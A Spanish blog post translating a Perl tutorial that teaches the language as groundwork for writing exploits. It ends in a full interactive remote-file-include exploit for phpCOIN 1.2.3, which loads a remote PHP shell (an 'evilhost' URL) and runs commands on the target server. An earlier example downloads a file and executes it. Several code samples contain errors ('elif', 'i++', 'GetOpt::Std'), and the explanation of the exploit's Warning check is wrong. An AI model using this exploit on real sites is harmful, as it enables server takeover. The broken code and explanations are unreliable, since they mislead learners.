---
layout: post
title:  "Aprendiendo Perl escribiendo exploits"
date:   2016-07-15 04:00:00 -0300
categories: articulos traducidos
---

El presente es un tutorial acelerado de programación en Perl originalmente escrito en inglés por Warpboy\<Warpboy1[at]yahoo.com\> para [www.securitydb.org](). El presente documento no es una traducción exacta del texto original ya que considero que algunas oraciones son poco explicativas.

Todo comentario o sugerencia es bienvenida,

$ grep


Contenido
=========
  - [0x01: Introducción](#introduction)
  - [0x02: Lo básico](#basics)
  - [0x03: Arrays](#arrays)
  - [0x04: Condicionales](#conditionals)
  - [0x05: Capturando la entrada del usuario](#gathering-user-input)
  - [0x06: Loops](#loops)
  - [0x07: LibWWWW](#libwww)
  - [0x08: Sockets](#sockets)
  - [0x09: Escribiendo un exploit](#writing-a-exploit)
  - [0x0A: Mejorando el conocimiento](#furthering-knowledge)
  - [0x0B: Fin](#the-end)
  - [0x0C: Agradecimientos](#credits-shoutz-contact)


### Notas:
  Te recomiendo que escribas y pruebes el código ya que esto te ayudará a comprender lo que el mismo pretende lograr. Transfórmate en un compilador humano.

  Preguntas/comentarios? vé a [0x0C](#credits-shoutz-contact), en donde mi información de contacto se encuentra.


Éxitos! pronto estarás codificando tu propio exploit!

Warpboy


# 0x01: Introducción<a name="introduction"></a>

Perl (Practical Extraction and Report Language) comenzó como un sistema para UNIX pero hoy se encuentra disponible para operar en la mayoría de los sistemas operativos como cualquier otro lenguaje. Perl es único como cualquier otro lenguaje de programación; se destaca por ser facil de aprender y facil de utilizar. Por qué deberías programar en Perl? pues porque Perl es único en el área del hacking. Cerca de un 70% de los exploits se encuentran codificadios en Perl. La razón del proqué muchos prefieren escribir los exploits en Perl es porque los mismos son más fáciles de interpretar, fáciles de descargar y usar, son eficientes y permiten realizar el trabajo de manera ligera. Por lo tanto, si te encuentras interesado en encontrar vulnerabilidades y compartir las mismas en forma de exploits codificados en Perl, entonces estas leyendo el documento correcto.


# 0x02: Lo básico<a name="basics"></a>

Bien, antes de que comenzar a programar en Perl necesitas descargar el intérprete de perl creado por ActiveState[1](#1). Puedes descargarlo desde [www.activestate.us][activestate-url]. Además necesitas un editor. Yo, personalmente, recomiendo [DzSofts Perl Editor][DzSofts-Perl-Editor]. Si buscas un editor libre entonces usa notepad. Si lo anteriormente mencionado no se ajusta a tu gusto o necesidad entonces googlea "Perl Editor". Los archivos Perl tienen una única extensión, todos tus archivos Perl deberían de estar almacenados con la extensión .pl.
Una vez que tenemos nuestro entorno preparado entonces podemos empezar. Perl es simple, y no tan dificil de aprender. Como con todos los lenguajes de programación, es mejor comenzar con una aplicación muy básica. Esta aplicación es comunmente conocida como un "Hello World". La misma te sumerje en el viaje aventurado de aprender un lenguaje. Vamos, crea un simple programa "Hello World" en Perl.

```perl
#!/usr/bin/perl -w
print "Hello World\n";
```

Guarda este código en un archivo HelloWorld.pl, en tu línea de comandos escribe _perl_ más un \<ESPACIO\>, arrastra el archivo a la linea de comandos y presiona \<ENTER\>. Esto debería imprimir el mensaje Hello World.

Veamos lo que hemos codificado. La primera línea (`#!/usr/bin/perl -w`) es el comienzo que TODO programa escrito en Perl debe tener. Esto es lo que hace que todo programa escrito en Perl sea reconocible, y por lo tanto interpretable. La **-w** en esta línea es una configuración para que el intérprete detecte los errores más simples. La segunda línea `print "Hello World\n";` es, obviamente, la línea que imprime Hello World en nuestra línea de comandos. **print** es una función usada con frecuencia en aplicaciones Perl. Para un mejor entendimiento, **print** es como el _msgbox_ en VB6 o el _printf_ en C. El **\n** es una combinación que representa un salto de línea en Perl. Existen muchas combinaciones que representan otros carácteres especiales en Perl; la siguiente es una referencia de los caracteres especiales que puedes usar:

|Combinación |Significado     |
|------------|----------------|
|\n          |NewLine         |
|\r          |Return          |
|\t          |Tab             |
|\f          |Form Feed       |
|\b          |Backspace       |
|\v          |Vertical Tab    |
|\e          |Escape          |
|\a          |Alarm           |
|\L          |Lowercase All   |
|\l          |Lowercase Next  |
|\U          |Uppercase All   |
|\u          |Uppercase First |

Para mostrarte otro ejemplo de la utilización de estos caracteres especiales puedes escribir el siguiente programa:

```perl
#!/usr/bin/perl -w
print "Hello\tWorld\n\a";
```

La segunda necesidad vital para que toda aplicación Perl pueda funcionar sin errores es el punto y coma al final de cada línea. Toda línea (al menos en un bloque) debe tener un punto y coma. Esto le dice al intérprete de Perl que pare de leer la sentencia a ejecutar.

Como la mayoría de los lenguajes de programación, Perl tiene variables. Las variables en Perl almacenan datos (temporales o permanentes) y pueden contener números o strings (cadena de carácteres) de casi cualquier longitud. Las variables en Perl son definidas con el signo _$_. Fíjate en el siguiente código que es otro Hello World pero que esta vez utiliza variables:

```perl
#!/usr/bin/perl -w
$Hello = "Hello World\n";
print "$Hello";
```

La variable es **$Hello**, la cual almacena el valor "Hello World\n". Entonces lo que se imprime es el contenido de esa variable.

En Perl no solo existen las comillas dobles _\"\"_ para denotar un string, también se pueden utilizar las comillas simples _\'\'_. Estas comillas simples son utilizadas en arrays y pueden ser utilizadas para reemplazar las comillas dobles. La principal diferencia entre ambas es que las comillas dobles permiten que el intérprete reemplace los carácteres especiales, tales como el salto de línea **\n**, lo cual no es permitido por las comillas simples.

Una función importante, cuando se trata de manejar strings en Perl, es la de concatenación. En Perl puedes concatenar strings de la siguiente forma:

```perl
#!/usr/bin/perl -w
#<---- El signo "#" no es interpretado como código Perl. Esto es utilizado para insertar comentarios.
$YourName = "YOURNAME"; #$YourName almacena el string "YOURNAME"1
print "Hello"." "."World"." "."My"." "."Name"." "."Is"." "."$YourName"."\n";
```

Lo anterior imprime Hello World My Name Is YOURNAME, pero primeramente el intérprete ha tenido que realizar un agregado o concatenado de strings para formar una secuencia. Esto parece duro, muy críptico y estúpido, pero será útil más tarde.

Perl es conocido por su capacidad de tratar con números. Perl tiene muchas funciones matemáticas como otros lenguajes de programación. Fíjate esta aplicación Perl, la cual imprime las funciones matemáticas básicas:

```perl
#!/usr/bin/perl
#Adding, Subtracting, Multiplying, and Dividing in Perl
#Perl can do all basic math functions and more.

$a = 3 + 5 ;  #Suma o adición
$b = 5 * 5;   #Multiplicación o producto
$c = 10 / 2 ; #División
$x = 12 - 5;  #Resta o substracción

print $a." "."ADDITION: The solution should be 8.\n";
print $b." "."MULTIPLICATION: The solution should be 25.\n";
print $c." "."DIVISION: The solution should be 5.\n";
print $x." "."SUBTRACTION: The solution should be 7.\n";

#Incremento y decremento
$Count = $Count + 1;
print "$Count\n";

#Lo mismo, pero más facil de leer
$Count1 += 1 ; #decremento $Count1 -=1 1
print "$Count1\n";

#Raiz cuadrada
$Square = sqrt(121) ;
print "The square root of 121 is $Square\n";

#Exponente
$Exp = 2**5 ;
print "$Exp\n";
```


# 0x03: Arrays<a name="arrays"></a>

Los arrays, también conocidos como listas, a diferencia de las variables vistas anteriormente, almacenan múltiples items los cuales pueden ser llamados o usados en otro momento de la ejecución de una aplicación Perl. Como siempre, es mejor echar un vistazo en un array en acción para poder comprenderlos. El siguiente programa es nuestro Hello World utilizando arrays:

```perl
#!/usr/bin/perl -w
@Hello = ('Hello', 'World'); # Las variables que almacenan arrays utilizan el símbolo @
print join(' ',@Hello)."\n";
```

Nuestra variable que almacena un array es **@Hello** y contiene dos valores: _"Hello"_, _"World"_. Los arrays pueden contener casi una infinidad de valores. La función **join** es utilizada cuando se quiere imprimir los elementos de un array. El siguiente programa imprime lo mismo que el que acabamos de ver, pero lo realiza a través de diferentes métodos:

```perl
#!/usr/bin/perl -w
#El método split
$Sentence = "Hello my name is Warpboy.";
@Words = split(/ /, $Sentence);
print "@Words"." "."That was splitting data"."\n";

#La forma más larga
@Hello = ('Hello', 'World');
print $Hello[0]." ".$Hello[1]."\n";
#La cuenta comienza en 0, entonce 'Hello' se encuentra en la posición 0, etc.
```

La función **split** es similar a **join**, este divide un string extrayendo las palabras separadas con espacios. El método más largo puede pareer confuso. Sin embargo, el mismo produce el mismo efecto que los métodos anteriores. Para crear un array, observa este código:

```perl
#!/usr/bin/perl -w
@array = qw(bam bam bam bam);
print join(' ', @array);
#Simple
```

Todo con todo, los arrays son simples, son listas que pueden contener datos, los cuales son útiles para nuestros programas.


# 0x04: Condicionales<a name="conditionals"></a>

Los condicionales, por carencias de un mejor término, son sentencias IF-THEN. Esto es una característica de todo lenguajes de programación, y si recuerdas, son utilizados en muchos cursos de matemáticas. Las sentencias _If-Then_ son utilizadas para evaluar la condición de una variable. Un ejemplo práctico de _If-Then_ puede ser: **If** (Si) Bob comió la manzana, **Then** él ya no tiene hambre. Entonces si Bob no come la manzana, es lógico asumir que él aún tiene hambre.

En Perl el formato básico de un _If-Then_ es:

```
if (condición lógica) { Then... }
```

Los condicionales son simples y utilizados con mucha frecuencia en la mayoría de los programas escritos en Perl. Observa esta acción condicional:

```perl
#!/usr/bin/perl -w
$i = 1;

if($i == 1) {
  $i++; #Incremento
  print $i."\n";
  #Esto imprime un 2, porque la variable $i es igual a 1 en la condición (osea, la condición es verdadera)
  #Si $i fuera cualquier otro #, entonces el programa no imprimiría nada
}
```

Los condicionales pueden ser utilizados también con strings en lugar de tratar con valores numéricos. Por ejemplo el siguiente código:

```perl
#!/usr/bin/perl -w
$i = 'Hello';

if($i eq 'Hello') {
  print "Hello!\n";
}
else {
  print "The variable (i) doesn't equal the correct string!\n";
}
#Cambia el valor de $i a cualquier valor,  este programa utilizará la rama else
```

El código utiliza un bloque o rama **else**, este bloque es utilizado en escenarios donde If-Then puede ser falso. esto lo verás más en código que recibe la entrada del usuario en donde la condición lógica puede ser falsa comunmente. Esto es lo básico de los condicionales en Perl. 


# 0x05: Capturando la entrada del usuario<a name="gathering-user-input"></a>

La entrada del usuario es utilizada en los exploits, casi siempre, por ello es vital comprender los métodos que existen para colectar la entrada del usuario en una aplicación Perl. La entrada del usuario es utilizada para captudar información proveniente del usuario con el objetivo de ser interpretada y procesada para brindar un resultado que depende del programa.

El siguiente es el primer método, el cual puede ser referenciado como el método _STDIN_. **STDIN** es un operador de entrada de línea; por ello, este colecta información del usuario.

```perl
#!/usr/bin/perl -w
#STDIN Method
print "Hello my name is Warpboy, what is your name?:";

$L1 = <STDIN>;

chomp $L1;

print "Nice to meet you $L1!\n";
```

La primer línea recibe la entrada y esta es almacenada en la variable **$L1**, entonces la variable es chomped (masticada o truncada) lo que significa que el caracter especial **\n** que tiene el string, es removido. Finalmente, lo recolectado es impreso.

El siguiente lo llamo el método _@ARGV_. **@ARGV** es como un array, pero no es cualquier array. **@ARGV** almacena los argumentos pasados al programa. Este método es muy utilizao en exploits. Un ejemplo de como se pasan estos argumentos es:

```
$ perl sploit.pl www.somesite.com /forums/ 1
```

Todos son argumentos (excluyento _perl_ y _sploit.pl_) los cuales pueden ser manejados por **@ARGV** e interpretado para imprimir una salida.

Ejemplo:

```perl
#!/usr/bin/perl -w
if(@ARGV != 2) {
  print "Usage: perl $0 <name> <number>\n";
  exit;
}

($name, $num) = @ARGV;

print "Hello $name & your number was: $num!\n";
```

El código toma los argumentos brindados (_\<name\>_ y _\<number\>_) y los almacena en el array **@ARGV**. Finalmente el contenido es impreso.

Pueden adivinar que **$0** es la variable utilizada para almacenar el nombre de nuestro archivo Perl (por ejemplo _file.pl_). Como puedes ver, el nombre del archivo es almacenado en **$0** y no en el array **@ARGV**.

El siguiente método usa un módulo de Perl para recolectar la entrada del usuario. Este módulo se llama GetOpt. Observa el siguiente código de ejemplo:

```perl
#!/usr/bin/perl -w
#GetOpt STD module
use GetOpt::Std;

getopts(":b:n", \%args);

if(defined $args{n}) {
  $n1 = $args{n};
}

if(defined $args{b}) {
  $n2 = $args{b};
}

if(!defined $args{n} or !defined $args{b}) {
  print "Usage: perl $0 -n Name -b Number\n";
  exit;
}

print "Hello $n1!\n";
print "Your number was: $n2\n";
print "Visit www.securitydb.org today!\n\n";
```

El código anteriorparece complicado; sin embargo, no es dificil de interpretar y entender lo que sucede en el programa. Primero el módulo "GetOpt" es llamado, luego es definido utilizando los flags que el programa desea utilizar. Los argumentos son almacenados en un hash.
Lo que sucede seguidamente es que nos encontramos con un condicional que básicamente dice: "si el user a definido el flag -n entonces almacena la información en la variable $n1". Este mismo proceso es repetido para -b. Al final creamos un condicional, este es como el **else** de un programa. Este Este último condicional básicamente imprime las reglas de uso si ninguno de los dos flags se han definido en el programa, y el programa finaliza con **exit;**. Después de que todas las entradas sean recolectadasusando el módulo GetOpt, los contenidos son impresos. A pesar de que exista más de una forma de utilizar GetOps, esta es probablemente mi favorita.

Estas son los métodos más comunes para obener la entrada del usuario en Perl. Estos métodos serán utilizados luego para escribir exploits para que el usuario final no tenga que configurar el código manualmente, haciendo al exploit más facil de manejar.


# 0x06: Loops<a name="loops"></a>

He escrito una app Perl que te explicará los diferentes loop (o bucles) en Perl. Si previamente has estudiado un lenguaje de programación esto es más sencillo de comprender. Veamos, que además se encuentra comentado:

```perl
#!/usr/bin/perl
#Loop Tutorials
#By Warpboy
#www.securitydb.org
#################
#FULLY Commented#
#################

#While Loops
# Su formato es
#   while(condición lógica) { Acción }
# Los bucles while se ejecutan tantas veces como su condición lógica sea verdadera.
# Si cambiara a falso, el bucle no vuelve a ejecutarse.
$i = 1;

while($i <= 5) {
  print "While:".$i."\n";
  i++;
}


#For Loops
# Su formato es
#   for(expresión inicial; condición lógica; expresión ejecutada por cada repetición) { Acción }
# Primeramente se ejecuta "expresión inicial", después se evalúa la "condición lógica".
# Si la "condición lógica" es verdadera, entonces se ejecuta el bloque, pero si es falsa, entonces no se vuelve a ejecutar for.
# Una vez ejecutado el bloque, "expresión ejecutada por cada repetición" es ejecutada, "condición lógica" evaluada.
# Si es verdadera, se vuelve a ejecutar el bloque, de lo contrario for no se vuelve a ejecutar, y así.
for($t = 1; $t <= 5; $t++) {
  print "For:".$t."\n";
}


#Until Loops
# Su formato es
#   until(condición lógica) { Acción }
# Un loop until es como un while, pero el mismo solo se ejecuta mientras la condición evaluada sea falsa.
# Si esta cambia a verdadero, entonces until no vuelve a ejecutarse.
$p = 1;

until($p == 6) {
  print "Until:".$p."\n";
  $p++;
}


#Foreach Loops
# Se usa comunmente para iterar sobre listas
# Su formato es
#   foreach $num (@array) { Acción }
$n = 1;

foreach $n (1..5) {
  print "Foreach:".$n."\n";
  $n++;
}

# Fin
```

Con suerte para mi, este código logra explicar loops (bucles o iteraciones) de una manera sencilla. Estos son muy utilizados en apps Perl. Después de practicar, no debería ser dificil para el lector el poder escribir código con loops.


# 0x07: LibWWW<a name="libwww"></a>

LibWWW o LWP, es un módulo incluido en la mayoría de los intérpretes Perl el cual permite interactuar con la Web. LWP puede ser utilizado de diferentes formas y no es solo un módulo, existen diferentes derivados, y los que vamos a utilizar en esta guía son LWP Usergent y LWP Simple. LWP no es complejo, y deberías encontrarte codificando aplicaciones Perl que interactúen con la Web al momento de terminar de leer esta sección. 

El primer módulo LWP del que vamos a hablar es LWP Simple. El mismo será probablemente uno de los más utilizados en tus exploits, y además te brinda conceptos fundamentales para poder mejorar el conocimiento de los diferentes módulos LWP existentes.

Para usar LWP Simple, o cualquier módulo, debes escribir lo siguiente:

```perl
use LWP::Simple; # llama al módulo que se encuentra en "C:\Perl\site\lib\LWP"

print "haha?\n";
```

Las funciones básicas de este módulo son:

 - `get($site);` - Captura el documento encontrado en la URL dada y lo retorna.
 - `getprint($site);` - Imprime lo que se encuentre en la URL.
 - `getstore($site, $savefile);` - Descarga y guarda un archivo.

Si deseas más documentación visita [libwww-perl/lib/LWP/Simple.pm](http://search.cpan.org/dist/libwww-perl/lib/LWP/Simple.pm). Vamos a utilizar una de las características de LWP Simple en el siguiente código para ver como trabaja. Este programa es un Web downloader básico:

```perl
#!/usr/bin/perl
#Perl Web Downloader
#by Warpboy
use LWP::Simple;

getstore('http://securitydb.org/images/Banner.png', 'banner.png'); #Descarga y almacena el archivo

system('banner.png'); # exec

sleep(3); #sleeps, waits

unlink('banner.png'); #borra el archivo
```

Simple, el archivo es descargado y almacenado usando la función **getstore**, que se encuentra en el módulo LWP Simple. El archivo es ejecutado usando el comando **system** y eliminado usando el comando **unlink** después de 3 segundos (**sleep(3)**).

El segundo módulo es LWP UserAgent; el cual tiene muchas más funcionalidades que LWP Simple. No debes aprender todas las características de UserAgent, solo las más utilizadas en los exploits veremos aquí. Si quieres conocer más sobre UserAgent, observa su documentación en [~gaas/libwww-perl-5.803/lib/LWP/UserAgent.pm](http://search.cpan.org/~gaas/libwww-perl-5.803/lib/LWP/UserAgent.pm).
Para empezar, veamos un poco acerca de GET requests, los cuales serán los comandos más utilizados en tus exploits. Un GET Request es el método más utilizado en la Web.
Para mostrar un ejemplo de GET Requests, he codificado un MD5 Database Filler, con muchos comentarios para que puedas comprender el código:

```perl
#!/usr/bin/perl
#MD5 Database Filler
#Version 1.0, Add Word Manually
#By Warpboy
#www.securitydb.org

#Modulos requeridos: LWP (User Agent), Digest (MD5)
# Descarga e instala el módulo Digest MD5: http://search.cpan.org/~gaas/DigestMD5-2.36/MD5.pm

use LWP::UserAgent; #Llamando al módulo LWP UserAgent
use Digest::MD5 qw(md5_hex); # Llamando al módulo Digest MD5

$brow = LWP::UserAgent->new; #Un nuevo UserAgent

while(1) { #Un while infinito
  print "Word to add:"; #Imprime "Word to add:"

  $var = <STDIN>; #Lo recuerdas de la sección "Capturando la entrada del usaurio"?

  chomp($var); #Quita el caracter especial '\n' que representa un salto de línea; que todo llamado a <STDIN> naturalmente devuelve.

  $seek = "http://md5.rednoize.com/?q=$var&b=MD5-Search"; #Nueva variable, se puede observar que el string tiene ?q=$var

  $brow->get($seek) or die "Failed to send GET request!\n"; #Se ejecuta la solicitud con el método GET a la URL almacenada en $seek

  print "$var".":".md5_hex("$var")." was added to database "."\n"; #Imprime la palabra agregada el MD5 (en hexadecimal) de lo que almacena $var
}

#Para probar este código, debes ir a http://md5.rednoize.com/ y buscar tu MD5 en hexadecimal.
#Este es un ejemplo simple de un GET Request a un servidor.
```

Este fué un ejemplo simple de un GET Request con LWP UserAgent, la función más importante que usarás al llamar a LWP UserAgent. Para mayor información acerca de lo que puedes hacer con LWP UserAgent te recomiendo que veas [~gaas/libwww-perl-5.803/lib/LWP/UserAgent.pm](http://search.cpan.org/~gaas/libwww-perl-5.803/lib/LWP/UserAgent.pm).


# 0x08: Sockets<a name="sockets"></a>

Esta sección cubre lo básico del módulo IO (Input/Output) Socket INET. Este módulo es poco usado en los exploits, pero lo he visto mucho en exploits tipo SQL Injection.
El módulo IO Socket INET brinda una interface de objetos para crear y usar sockets en el dominio AF_INET. Vamos a crear un socket simple para conectarnos a un IP en el puerto 80. Vamos, interpreta el siguiente código:

```perl
#!/usr/bin/perl
use IO::Socket;

print "An IP to connect to: ";

$ip = <STDIN>;

chomp($ip);

$i=1;

while($i <= 5) {
  $sock = IO::Socket::INET->new(Proto=>'tcp', PeerAddr=>"$ip", PeerPort=>'80')
  or die "Couldn't connect!\n";
  
  print "Connected!\n";
  
  $i++;
}
```

La primer línea llama al módulo IO Socket. Las siguientes tres líneas usan el método STDIN, de captura de entrada del usuario. Tomamos el IP que ingresa el usuario y la almacenamos en **$ip**. Deberías entender esto ya que lo vimos en la sección [0x05: Capturando la entrada del usuario](#gathering-user-input).
Definimos la variable **$i** con el valor 1. Después el loop while ejecuta 5 veces el código del socket. El código del socket tiene Proto o Protocol (TCP/UDP) y nosotros usamos TCP. PeerAddr o Peer Address es igual al IP que el usuario a dado como entrada (almacenado en **$ip**). El puerto, PeerPort, es igual a 80 (HTTP). El código del socket contiene una sentencia que usa la función **die** la cual se ejecuta si una falla la conexión, esta sentencia imprime el mensaje  "Couldn't connect[newline]". La última línea es nuestra verdadera sentencia, la cual imprime "Connected![newline]" si no falla la conexión. Después se incrementa nuestra variable **$i**.
Como dije anteriormente este módulo es usado comunmente en exploits tipo SQL Injection. Este módulo ha sido usado para construir troyanos en Perl, sin embargo, ya que Perl es opensource y no se carga automáticamente en máquinas con Windows, programar troyanos en Perl es más un juego y son fáciles de prevenir.


# 0x09: Escribiendo un exploit<a name="writing-a-exploit"></a>

Ahora es tiempo, tiempo de compilar todo lo que hemos visto. En esta sección toda la información de las secciones anteriores se utiliza para crear un exploit, codificado en Perl, The exploit que vamos a dodificar es uno que explota una vulnerabilidad tipo RFI (Remote File Include) descubierta por mi amigo TimQ. La aplicación web que tiene esta vulnerabilidad es phpCOIN 1.2.3. Un link a la prueba del concepto (PoC): [http://milw0rm.com/exploits/2254](http://milw0rm.com/exploits/2254).
Empecemos. Lo primero que vamos a hacer es definir unas cuantas variables y configurar la entrada del usuario. Veamos:

```perl
#!/usr/bin/perl
use LWP::UserAgent; #Llamamos a nuestro módulo

#Almacenamos la entrada del usuario en estas variables
$site = @ARGV[0];
$shellsite = @ARGV[1];
$shellcmd = @ARGV[2];

if($site !~ /http:\/\// || $shellsite !~ /http:\/\// || !$shellsite) { #Evalúa la validez de las URL's ingresadas
  usg(); #Si las URL's ingresadas NO son válidas, ejecutar la subrutina usg
}

header(); #Ejecutar la subrutina header
```

Lo primero que hacemos es llamar al módulo LWP UserAgent. Seguidamente configuramos la entrada del usuario para almacenarla en **$site**, **$shellsite** y **$shellcmd**. Después tenemos una condición que valida las URL's ingresadas por el usuario. Sin esto el programa puede fallar y un enlace inválido es utilizado. Si el enlace es válido el programa ejecuta la subrutina **usg** (Que se localiza más abajo en el código de nuestro exploit). Una vez que el condicional se ha evaluado, la subrutina **header** es ejecutada (también localizada más abajo en el código del exploit).
Avancemos:

```perl
while() {
  print "[shell] \$";

  while(<STDIN>) {
    $cmd = $_;

    chomp($cmd);
```

Loops, deberías recordarlos. Tenemos un **while** para que el programa ejecute interminablemente (esto es igual a **while(1)**). Se imprime "[shell] $" para tomar el primer comando shell. Después tenemos el loop **while(\<STDIN\>)** el cual itera mientras reciba entrada del usuario. Este loop es lo último que ejecuta nuestro programa.
Sigamos:

```perl
$xpl = LWP::UserAgent->new()
  or die;
$req = HTTP::Request->new(GET=>$site.'/coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]='.$shellsite.'?&'.$shellcmd.'='.$cmd)
  or die "\n\n Failed to Connect, Try again!\n";

$res = $xpl->request($req);
$info = $res->content;
$info =~ tr/[\n]/[&#234]/;
```

Auí usamos el módulo LWP UserAgent para demostrar la vulnerabilidad en el exploit. La variable **$xpl** es definida como un objeto LWP UserAgent. **$req** ejecuta la solicitud GET en la página ingresada por el usuario (**$site**), aquí el código vulnerable es puesto al de **$site**. **$shellsite**, es donde se encuentra el backdoor, **$shellcmd** (la variable del comando de shell php) y **$cmd** es el comando que el usuario quiere ejecutar en el server junto con el backdoor. El contenido devuelto como respuesta a nuestra solicitud GET es almacenado en la variable **$info**.

```perl
if (!$cmd) {
  print "\nEnter a Command\n\n";

  $info = "";
}
elif ($info =~ /failed to open stream: HTTP request failed!/ || $info =~ /: Cannot execute a blank command in <b>/) {
  print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";

  exit;
}
elif ($info =~ /^<br\/>.<b>Warning/) {
  print "\nInvalid Command\n\n";
};
```

Estos condicionales evaluan el contenido almacenado en **$info** para encontrar errores ya sea a causa de la entrada dada por el usuario o por algún error en el sitio. Esto es facil de entender, no se necesita mucha explicación.
Sigamos:

```perl
if ($info =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/) {
  $final = $1;
  $final =~ tr/[&#234]/[\n]/;

  print "\n$final\n";

  last;
} 
```

Esta porción de código es escencial en este exploit. La misma evalúa la aplicación Web en busca de la vulnerabilidad. Si el contenido devuelto contiene el string "Warning", entonces el programa finaliza indicado que el sitio no es vulnerable.
Continuemos:

```perl
    else {
      print "[shell] \$";
    } #fin de else
  } #fin de while(STDIN)
} #fin de while()

last;

sub header() {
  print q{
  ++++++++++++++++++++++++++++++++++++++++++++++
      phpCOIN 1.2.3 -- Remote Include Exploit
      Vulnerablity found by: TimQ
      Exploit coded by: Warpboy
      www.securitydb.org
      Original PoC: http://milw0rm.com/exploits/2254
  ++++++++++++++++++++++++++++++++++++++++++++++
  }
}
```

Esta sección contiene un **else** para todos los condicionales anteriores. El final del código es nuestra subrutina **header**, llamada enteriormente en el exploit.
Y finalmente:

```perl
sub usg()
{
  header();
  
  print q{
  ======================================================================
      Usage: perl sploit.pl <phpCOIN FULL PATH> <Shell Location> <Shell Cmd>
      
      <phpCOIN FULL PATH> - Path to site exp. www.site.com
      <Shell Location> - Path to shell exp. www.evilhost.com/shell.txt
      <Shell Cmd Variable> - Command variable for php shell
      Example: perl C:\sploit.pl http://www.site.com/phpCOIN/
  =======================================================================
  };
  
  exit();
}
```

Esta es la subrutina **usg** y una llamada a la función **exit** si es que todo el código anterior es salteado (_bypassed_) por cualquier error.


# 0x0A: Mejorando el conocimiento<a name="furthering-knowledge"></a>

Es vital continuar con la educación. El conocimiento contiene un inmenso poder. Al leer este documento has comenzado a rozar la cima de tus capacidades. A continuación, algunos links que puedes visitar si estas interesado en conocer más de Perl.

- http://www.cpan.org
- http://www.securitydb.org/forum/
- http://www.programmingtutorials.com/perl.aspx
- http://www.pageresource.com/cgirec/index2.htm
- http://www.cclabs.missouri.edu/things/inst...perlcourse.html
- http://www.ebb.org/PickingUpPerl/pickingUpPerl_toc.html
- http://vsbabu.org/tutorials/perl/
- http://www.freeprogrammingresources.com/perl.html
- http://www.thescripts.com/serversidescript...guru/page0.html
- http://www.perl.com/pub/a/2002/08/20/perlandlwp.html
- http://www.perl.com
- http://www.perlmonks.org/index.pl?node=Tutorials

Of course
www.google.com

Existe una gran variedad de copias de libros y e-books los cuales pueden enseñarte más de lo que fue tocado en este documento. Sin embargo, esta guía debería brindar unos buenos fundamentos para que tus skills en Perl crezcan y prosperen.


# 0x0B: Fin<a name="the-end"></a>

Learning Perl - Writing Exploits ha sido una buena experiencia para mi espero que lo haya sido para el lector. Como un autor de muchos tutoriales, este ha sido el más largo. Me ha refrescado y he descubierto nuevas técnicas de codificación. 


# 0x0C: Agradecimientos<a name="credits-shoutz-contact"></a>

Créditos para TimQ por encontrar la vulnerabilidad phpCOIN y dejar que la utilice en este documento.

### Contacto
- Warpboy1@yahoo.com


\[1\]<a name="1"></a>: El intérprete de Perl de ActiveState es solo uno de los tantos intérpretes que puedes encontrar en internet.

[activestate-url]: http://www.activestate.us/
[DzSofts-Perl-Editor]: http://www.dzsoft.com/